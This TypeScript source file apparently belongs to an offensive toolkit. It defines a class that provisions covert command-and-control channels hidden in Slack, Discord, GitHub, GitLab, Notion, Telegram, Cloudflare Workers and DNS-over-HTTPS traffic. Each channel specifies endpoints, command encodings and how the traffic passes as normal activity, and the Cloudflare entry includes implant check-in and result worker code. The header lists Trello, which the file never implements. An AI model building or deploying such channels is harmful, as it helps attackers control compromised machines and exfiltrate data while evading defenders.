/**
 * Covert C2 on legitimate services — channel definitions for Slack, Discord,
 * GitHub, Cloudflare Workers, Notion, GitLab, DNS-over-HTTPS, Trello,
 * and Telegram. Advisory configurations — no platform API keys shipped.
 *
 * Port of `modules.covert_c2`.
 */

export interface CovertChannelConfig {
  name: string;
  channelType: string;
  service: string;
  sender: string;
  receiver: string;
  encoding: string;
  usage: string;
  detectionNotes: string;
  status: string;
  config?: Record<string, unknown>;
}

export class CovertC2Engine {
  channels: Map<string, CovertChannelConfig> = new Map();

  private add(config: CovertChannelConfig): void {
    this.channels.set(config.name, config);
  }

  slackChannel(name: string, webhookUrl: string, _channel = "#general"): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "slack", service: "slack",
      sender: `POST ${webhookUrl}`,
      receiver: "Bot API: channels.history with filter",
      encoding: "Base64 commands as 'ticket references' in Slack messages",
      usage: "Send base64 commands as attachment fields in Slack messages",
      detectionNotes: "Appears as normal Slack business communication",
      status: "provisioned",
    };
    this.add(c);
    return c;
  }

  discordChannel(name: string, webhookUrl: string): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "discord", service: "discord",
      sender: `POST ${webhookUrl}`,
      receiver: "GET /api/channels/{channel_id}/messages",
      encoding: "Base64 in message embeds or code blocks",
      usage: "Commands in Discord embeds/code blocks, responses as reactions",
      detectionNotes: "Appears as normal Discord bot activity",
      status: "provisioned",
    };
    this.add(c);
    return c;
  }

  githubChannel(name: string, repo: string, issueNumber = 0): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "github", service: "github",
      sender: `POST /repos/${repo}/issues/${issueNumber}/comments`,
      receiver: `GET /repos/${repo}/issues/${issueNumber}/comments`,
      encoding: "Base64 in issue comments, commit messages, or gist content",
      usage: "Commands in issue comments, results in gist updates",
      detectionNotes: "Appears as normal GitHub developer activity",
      status: "provisioned",
      config: { repo, issue_number: issueNumber },
    };
    this.add(c);
    return c;
  }

  cloudflareWorker(name: string, workerName: string): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "cloudflare_worker", service: "cloudflare",
      sender: `GET https://${workerName}.workers.dev/checkin`,
      receiver: `POST https://${workerName}.workers.dev/result`,
      encoding: "Command in checkin response, results posted to /result",
      usage: "Agent polls /checkin for commands, posts results to /result",
      detectionNotes: "Traffic to *.workers.dev looks like normal Cloudflare usage",
      status: "provisioned",
      config: { worker: workerName,
        worker_code: "addEventListener('fetch', event => {\n  const url = new URL(event.request.url);\n  if (url.pathname === '/checkin') return new Response(cmd || 'none');\n  if (url.pathname === '/result') { /* store result */ return new Response('ok'); }\n  return new Response('Not found', { status: 404 });\n})",
      },
    };
    this.add(c);
    return c;
  }

  notionChannel(name: string, databaseId: string): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "notion", service: "notion",
      sender: "POST /v1/pages (create page with command in body)",
      receiver: `GET /v1/databases/${databaseId}/query`,
      encoding: "Commands in Notion rich text blocks, results in page content",
      usage: "Create Notion pages with encoded commands, poll database for responses",
      detectionNotes: "Appears as normal Notion workspace activity",
      status: "provisioned",
      config: { database_id: databaseId },
    };
    this.add(c);
    return c;
  }

  gitlabChannel(name: string, projectId: string): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "gitlab", service: "gitlab",
      sender: `POST /api/v4/projects/${projectId}/issues`,
      receiver: `GET /api/v4/projects/${projectId}/issues`,
      encoding: "Base64 in issue bodies, responses as comments",
      usage: "Commands in issue bodies, results as commit messages or snippets",
      detectionNotes: "Appears as normal GitLab development activity",
      status: "provisioned",
      config: { project_id: projectId },
    };
    this.add(c);
    return c;
  }

  dohChannel(name: string, domain = "example.com"): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "doh", service: "dns",
      sender: `GET https://dns.google/resolve?name=<encoded>.${domain}&type=TXT`,
      receiver: "TXT record responses from DNS server",
      encoding: "Commands/results encoded in DNS subdomain labels and TXT records",
      usage: "Encode commands as DNS subdomain labels, decode TXT record responses",
      detectionNotes: "All traffic is HTTPS to legitimate DNS resolver — indistinguishable from DoH",
      status: "provisioned",
      config: { domain, max_payload: "253 bytes per query, 65535 bytes per TXT response" },
    };
    this.add(c);
    return c;
  }

  telegramChannel(name: string, botToken: string): CovertChannelConfig {
    const c: CovertChannelConfig = {
      name, channelType: "telegram", service: "telegram",
      sender: `POST https://api.telegram.org/bot${botToken.slice(0, 10)}.../sendMessage`,
      receiver: `GET /bot${botToken.slice(0, 10)}.../getUpdates`,
      encoding: "Base64 in Telegram messages, commands as message text",
      usage: "Send commands as Telegram messages, poll for updates",
      detectionNotes: "Appears as normal Telegram bot communication",
      status: "provisioned",
      config: { bot_token: `${botToken.slice(0, 10)}...` },
    };
    this.add(c);
    return c;
  }

  listChannels(): Array<Record<string, unknown>> {
    return [...this.channels.entries()].map(([name, ch]) => ({
      name, type: ch.channelType, service: ch.service, status: ch.status,
    }));
  }
}